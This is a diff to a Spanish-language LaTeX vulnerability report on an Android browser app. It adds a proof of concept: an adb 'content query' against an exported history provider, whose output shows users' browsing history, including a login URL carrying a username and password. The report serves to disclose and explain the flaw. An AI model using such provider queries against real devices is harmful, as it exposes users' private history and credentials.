@@ -68,11 +68,32 @@ Dado que los archivos \texttt{smali} son particularmente dificultosos de leer, o
 \end{figure}
 \end{center}
 
+\vspace{-30pt}
 \subsubsection{Prueba de Concepto}
+A continuación se muestra un query al content provider \textbf{history\_provider}, realizado con el comando \texttt{content} del shell de Android. Antes de ello, se navegó a través de algunas páginas con usuarios distintos, Google y Facebook con el primer usuario, y Taringa con el segundo usuario.
+
 \begin{verbatim}
 $ adb shell content query --uri "content://ar.sadosky.browser.history_provider/history"
 Row: 0 url_visited=about:blank
+Row: 1 url_visited=http://www.google.com.ar/
+Row: 2 url_visited=http://www.google.com.ar/intl/es-419/policies/privacy/?fg=1
+Row: 3 url_visited=https://facebook.com/
+Row: 4 url_visited=https://www.facebook.com/?_rdr
+Row: 5 url_visited=https://m.facebook.com/?_rdr&refsrc=https%3A%2F%2Fwww.facebook.com%2F
+Row: 6 url_visited=https://mail.google.com/mail/
+Row: 7 url_visited=https://accounts.google.com/ServiceLogin?service=mail&passive=true
+&continue=https://mail.google.com/mail/?ui%3Dmobile%26zyp%3Dl&scc=1&ltmpl=ecobx
+&nui=5&btmpl=mobile&emr=1
+Row: 8 url_visited=http://www.taringa.net/
+Row: 9 url_visited=http://m.taringa.net/
+Row: 10 url_visited=http://www.taringa.net/login.html?user=taringuero&pass=1234
+Row: 11 url_visited=http://m.taringa.net/posts/hazlo-tu-mismo/18505791/
+Te-enseno-a-hacer-una-mochila-3.html
 \end{verbatim}
+
+Como se puede apreciar, por las razones expuestas anteriormente, todo el historial de los usuarios puede ser obtenido muy fácilmente. No sólo es posible ver eso, sino también que el historial de todos los usuarios de la aplicación se encuentra guardado sin distinción del usuario que lo produjo, por lo que todos los usuarios comparten el mismo historial.
+
+El hecho de que el historial sea accesible por cualquier aplicación, representa no solo una brecha a la privacidad del usuario, sino que también existe el peligro de robo de sesiones/credenciales de los sitios en que navega el usuario, suponiendo que alguno de estos datos sean enviados a través de peticiones GET\footnote{Lo cual en sí ya representa una vulnerabilidad}.
 
 %
 %-- Sección: Vulnerabilidades de Red
